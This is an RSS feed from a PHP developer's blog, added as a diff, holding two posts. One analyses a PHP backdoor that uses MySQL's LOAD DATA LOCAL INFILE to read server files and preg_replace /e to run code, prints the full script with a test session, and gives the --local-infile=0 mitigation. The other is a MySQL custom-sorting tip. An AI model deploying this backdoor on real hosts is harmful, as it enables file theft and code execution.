@@ -1,0 +1,240 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>Yet Another Angry Web Developer &#187; DBA</title>
+	<atom:link href="http://marco-pivetta.com/category/it/development/dba/feed/" rel="self" type="application/rss+xml" />
+	<link>http://marco-pivetta.com</link>
+	<description>Web Development as seen by a Web Developer</description>
+	<lastBuildDate>Thu, 16 May 2013 20:30:39 +0000</lastBuildDate>
+	<language>en-US</language>
+	<sy:updatePeriod>hourly</sy:updatePeriod>
+	<sy:updateFrequency>1</sy:updateFrequency>
+	<generator>http://wordpress.org/?v=4.2.5</generator>
+	<item>
+		<title>PHP Security Exploit: MySQL as a Backdoor with Load Data Local Infile</title>
+		<link>http://marco-pivetta.com/php-exploit-mysql-backdoor-with-load-data-local-infile/</link>
+		<comments>http://marco-pivetta.com/php-exploit-mysql-backdoor-with-load-data-local-infile/#comments</comments>
+		<pubDate>Sun, 09 Oct 2011 22:11:40 +0000</pubDate>
+		<dc:creator><![CDATA[ocramius]]></dc:creator>
+				<category><![CDATA[5.3]]></category>
+		<category><![CDATA[DBA]]></category>
+		<category><![CDATA[Development]]></category>
+		<category><![CDATA[Exploits]]></category>
+		<category><![CDATA[IT]]></category>
+		<category><![CDATA[MySQL]]></category>
+		<category><![CDATA[PHP]]></category>
+		<category><![CDATA[Programming]]></category>
+		<category><![CDATA[backdoor]]></category>
+		<category><![CDATA[exploit]]></category>
+		<category><![CDATA[lamp]]></category>
+		<category><![CDATA[php]]></category>
+		<category><![CDATA[sql injection]]></category>
+
+		<guid isPermaLink="false">http://marco-pivetta.com/?p=109</guid>
+		<description><![CDATA[Yesterday I stumbled on a piece of code shown me by my friend Andrea Guglielmo. It is an exploit that could affect mostly shared hosting solutions, and which I&#8217;ve never seen before, even if it has not been invented recently. &#8230; <a href="http://marco-pivetta.com/php-exploit-mysql-backdoor-with-load-data-local-infile/">Continue reading <span class="meta-nav">&#8594;</span></a>]]></description>
+				<content:encoded><![CDATA[<p>Yesterday I stumbled on a piece of code shown me by my friend <a href="https://plus.google.com/114521214467532396887" target="_blank" rel="external nofollow">Andrea Guglielmo</a>.</p>
+<p>It <strong>is an exploit</strong> that <strong>could affect</strong> mostly<strong> shared hosting</strong> solutions, and which I&#8217;ve never seen before, even if it has not been invented recently.</p>
+<p><span id="more-109"></span></p>
+<p>It is <strong>not</strong> really<strong> well written</strong> piece of <a href="http://php.net" target="_blank" rel="external nofollow tag">PHP</a> code:</p>
+<ul>
+<li>you can immediately notice that it requires <code>ini_set('short_open_tag', true);</code></li>
+<li>it is <strong>vulnerable to <a href="http://en.wikipedia.org/wiki/SQL_injection" target="_blank" rel="external nofollow tag">sql injections</a></strong></li>
+<li>it <strong>allows arbitrary MySQL credentials</strong> (username, password and database) to be passed in <strong>via <code>$_GET</code></strong></li>
+</ul>
+<p>But this is not the point of the discussion.</p>
+<p>Let&#8217;s first get our eyes on it:</p>
+<pre class="brush: php">&lt;?
+$mysql_host = (isset($_GET[mysql_host]))?$_GET[mysql_host]:"localhost";
+$mysql_user = (isset($_GET[mysql_user]))?$_GET[mysql_user]:"";
+$mysql_pass = (isset($_GET[mysql_pass]))?$_GET[mysql_pass]:"";
+$calcname = explode(".",getenv("HTTP_HOST"));
+$mysql_name =(isset($_GET[mysql_name]))?$_GET[mysql_name]:"my_".$calcname[0];
+$mysql_xploit = preg_replace("/(.+)/e", $_GET[db], $_GET[db]);
+$path = (isset($_GET[path]))?$_GET[path]:"/membri/SITO/config.php";
+$limit = (isset($_GET[limit]))?$_GET[limit]:"0,30";
+$search = (isset($_GET[search]))?$_GET[search]:"";
+?&gt;
+&lt;form action="#" method="GET"&gt;
+host &lt;input type=text name=mysql_host value='&lt;?=$mysql_host;?&gt;'/&gt;&lt;br /&gt;
+user &lt;input type=text name=mysql_user value='&lt;?=$mysql_user;?&gt;'/&gt;&lt;br /&gt;
+pass &lt;input type=text name=mysql_pass value='&lt;?=$mysql_pass;?&gt;'/&gt;&lt;br /&gt;
+name &lt;input type=text name=mysql_name value='&lt;?=$mysql_name;?&gt;'/&gt;&lt;br /&gt;
+path &lt;input type=text name=path value='&lt;?=$path;?&gt;' /&gt;&lt;br /&gt;
+[ limit &lt;input type=text name=limit value='&lt;?=$limit;?&gt;' /&gt; ]&lt;br /&gt;
+[ search &lt;input type=text name=search value='&lt;?=$search;?&gt;' /&gt; ]&lt;br /&gt;
+&lt;input type=submit value=send /&gt;
+&lt;/form&gt;
+&lt;?
+
+if (isset($_GET[mysql_host])) {
+  $search = $_GET[search];
+  $link = mysql_connect($_GET['mysql_host'], $_GET['mysql_user'], $_GET['mysql_pass'])or die(mysql_error());
+  $db = mysql_select_db($_GET['mysql_name']);
+  $path = $_GET['path'];
+  $limit = $_GET['limit'];
+  $query = "CREATE TABLE `exploit` (`path` longtext not null);";
+  $delete =  "DROP TABLE `exploit`;";
+  $bypass = "LOAD DATA LOCAL INFILE '$path' INTO TABLE exploit;";
+  $l = (!empty($_GET[limit])) ? " LIMIT $limit" : "";
+  $fu = "SELECT * FROM exploit".$l;
+  mysql_query($delete);
+  mysql_query($query)or die(mysql_error());
+  mysql_query($bypass)or die("Mysql-exploit-error : ".mysql_error());
+  $res = mysql_query($fu)or die(mysql_error());
+  $txt = "";
+  while($row = mysql_fetch_array($res)) {
+    $txt .= $row[path]."\n";
+  }
+  $output = "&lt;form action=# method=POST&gt;&lt;input type=hidden name=mode value=sqlwritefile&gt;
+  &lt;textarea rows=30 cols=100 name=newtext&gt;".htmlspecialchars($txt)."&lt;/textarea&gt;&lt;/form&gt;";
+}
+
+if (!empty($search)) {
+  $q = "SELECT * FROM exploit WHERE path LIKE '%".$search."%'";
+  $result = mysql_query($q)or die("Mysql-exploit-error : ".mysql_error());
+  $txt2 = "";
+  while($riga = mysql_fetch_assoc($result)) {
+    $txt2 .= $riga[path];
+  }
+  $output .= "Search results: &lt;form action=# method=POST&gt;&lt;input type=hidden name=mode value=sqlwritefile&gt;
+  &lt;textarea rows=30 cols=100 name=newtext&gt;".htmlspecialchars($txt2)."&lt;/textarea&gt;&lt;/form&gt;";
+}
+echo $output;
+?&gt;</pre>
+<p><strong>So here&#8217;s what it does:</strong></p>
+<ol>
+<li><strong>connects to</strong> a <strong>MySQL</strong> database</li>
+<li><strong>creates</strong> a <strong>table</strong> called &#8220;<strong>exploit</strong>&#8220;</li>
+<li><strong>loads data from</strong> an arbitrary <strong>path</strong> passed in<strong> by <code>$_GET['path']</code></strong></li>
+<li><strong>Allows querying</strong> for data</li>
+</ol>
+<p>So you could ask me: Marco, <strong>what&#8217;s the problem?</strong> We already do that with <code>file_get_contents($path)</code>.</p>
+<p>The problem is that <strong>MySQL is a service</strong> running on it&#8217;s own. Usually,<strong> your PHP process is &#8220;jailed&#8221; within the limits of the www-data user</strong> or the one that suPHP has provided you&#8230;<br />
+I&#8217;m thinking of a standard <a href="http://debian.org/" target="_blank" rel="external nofollow tag">Debian</a> installation, where <strong>MySQL</strong> usually <strong>runs under user &#8220;mysql&#8221;, which has access to some interesting stuff</strong>, like <code>/var/log/mysql.err</code>, <code>/var/log/mysql.log.*</code>, <code>/var/log/mysql/*</code> and <code>/var/lib/mysql/*</code>, and this without considering all what the privileges of the user &#8220;mysql&#8221; implies.</p>
+<p>So <strong>what about copying an entire log file</strong> or binlog file into the &#8220;exploit&#8221; table <strong>and displaying it</strong> to anonymous evil h4x0r? Creepy&#8230;</p>
+<p>Here&#8217;s a sample I&#8217;ve just tested:</p>
+<pre class="brush: sql">mysql&gt; create database exploittest;
+Query OK, 1 row affected (0.00 sec)
+mysql&gt; use exploittest;
+Database changed
+mysql&gt; CREATE TABLE `exploit` (`path` longtext not null);
+Query OK, 0 rows affected (0.01 sec)
+
+mysql&gt; LOAD DATA LOCAL INFILE '/var/lib/mysql/test.txt' INTO TABLE exploit;
+Query OK, 3 rows affected (0.05 sec)
+Records: 3 Deleted: 0 Skipped: 0 Warnings: 0
+
+mysql&gt; select * from exploit;
++--------+
+| path |
++--------+
+| aaaa |
+| bbbbb |
+| cccccc |
++--------+
+3 rows in set (0.00 sec)</pre>
+<p>Well, <strong>there&#8217;s a simple solution</strong> you SHOULD adopt if you have any customers with access to PHP code on your server. Here&#8217;s what the MySQL manual states:</p>
+<blockquote><p><strong>You can disable all LOAD DATA LOCAL</strong> statements from the server side by starting mysqld <strong>with the &#8211;local-infile=0 option</strong>.</p></blockquote>
+<p>You can could read more about it here:</p>
+<p><a href="http://dev.mysql.com/doc/refman/5.0/en/load-data-local.html" target="_blank" rel="external nofollow tag">MySQL LOAD DATA LOCAL INFILE</a>.</p>
+<p>Always remember that <strong>security is NEVER enough!</strong></p>
+<p>&nbsp;</p>
+<p>This page has been translated into <a href="http://www.webhostinghub.com/support/es/misc/otra-desarrollador" target="_blank">Spanish</a> language by Maria Ramos from <a href="http://www.webhostinghub.com/support/edu">Webhostinghub.com</a>.</p>
+]]></content:encoded>
+			<wfw:commentRss>http://marco-pivetta.com/php-exploit-mysql-backdoor-with-load-data-local-infile/feed/</wfw:commentRss>
+		<slash:comments>2</slash:comments>
+		</item>
+		<item>
+		<title>MySQL Custom Sorting Rules</title>
+		<link>http://marco-pivetta.com/mysql-custom-sorting-rule-mysql/</link>
+		<comments>http://marco-pivetta.com/mysql-custom-sorting-rule-mysql/#comments</comments>
+		<pubDate>Fri, 08 Oct 2010 11:12:39 +0000</pubDate>
+		<dc:creator><![CDATA[ocramius]]></dc:creator>
+				<category><![CDATA[DBA]]></category>
+		<category><![CDATA[Development]]></category>
+		<category><![CDATA[IT]]></category>
+		<category><![CDATA[MySQL]]></category>
+		<category><![CDATA[Tricks]]></category>
+		<category><![CDATA[Query]]></category>
+		<category><![CDATA[SQL]]></category>
+
+		<guid isPermaLink="false">http://marco-pivetta.com/?p=21</guid>
+		<description><![CDATA[How to sort data in MySQL with a custom sorting list... Easy! <a href="http://marco-pivetta.com/mysql-custom-sorting-rule-mysql/">Continue reading <span class="meta-nav">&#8594;</span></a>]]></description>
+				<content:encoded><![CDATA[<p>Today I was facing troubles with the administrative dept of the web agency where I&#8217;m working in&#8230; They wanted to have their receiptive structures sorted by a custom role&#8230;</p>
+<p>What I first thought about was a MySQL Union query where I had to fetch all distinct types of receiptive structures (Hotels, B&amp;Bs, Campings, etc&#8230;) in the desired order in different parametrized queries&#8230; Something like the following:</p>
+<pre class="brush: sql">(
+  SELECT
+    1 as sorting_column,
+    *
+  FROM receiptive_structures
+  WHERE type_id=4
+) AS a
+UNION ALL
+(
+  SELECT
+    2 as sorting_column,
+    *
+  FROM receiptive_structures
+  WHERE type_id=2
+) AS b
+UNION ALL
+(
+  SELECT
+    3 as sorting_column,
+    *
+  FROM receiptive_structures
+  WHERE type_id=7
+) AS c
+UNION ALL
+(
+  SELECT
+    4 as sorting_column,
+    *
+  FROM receiptive_structures
+  WHERE type_id=1
+) AS d
+ORDER BY sorting_column ASC</pre>
+<p>Althrough the &#8216;sorting_column&#8217; shouldn&#8217;t be necessary, I had too many bad experiences with mysql and its sorting features (expecially when merging together resultsets, like in this case).</p>
+<p>Nasty solution&#8230;<br />
+I decided to continue looking for a more elegant way of doing this&#8230;</p>
+<p>I decided to use some kind of on-the-fly generated function in the ORDER BY clause of my MySQL Custom Sorting Query:</p>
+<pre class="brush: sql">SELECT
+((type_id=4)*1
++(type_id=2)*2
++(type_id=7)*3
++(type_id=1)*4) AS sorting_column,
+r.*
+FROM receiptive_structures AS r
+ORDER BY sorting_column ASC</pre>
+<p>Still looks ugly&#8230;<br />
+Digging into the MySQL manual, found out that there&#8217;s a faster way of doing that!</p>
+<pre class="brush: sql">SELECT * FROM receiptive_structures
+ORDER BY FIELD(priority, 4,2,7,1);</pre>
+<p>And here&#8217;s a quick overview of the MySQL FIELD() &#8220;weight&#8221; function <img src="http://marco-pivetta.com/wp-includes/images/smilies/simple-smile.png" alt=":)" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
+<pre class="brush: sql">Database changed
+mysql> select id, FIELD(id,4,2,7,1) AS sorting
+    -> FROM l10n ORDER BY sorting DESC limit 5;
++----+---------+
+| id | sorting |
++----+---------+
+|  1 |       4 |
+|  7 |       3 |
+|  2 |       2 |
+|  4 |       1 |
+|  3 |       0 |
++----+---------+
+5 rows in set (0.00 sec)</pre>
+<p>I hope this will be useful for you <img src="http://marco-pivetta.com/wp-includes/images/smilies/simple-smile.png" alt=":)" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
+]]></content:encoded>
+			<wfw:commentRss>http://marco-pivetta.com/mysql-custom-sorting-rule-mysql/feed/</wfw:commentRss>
+		<slash:comments>1</slash:comments>
+		</item>
+	</channel>
+</rss>
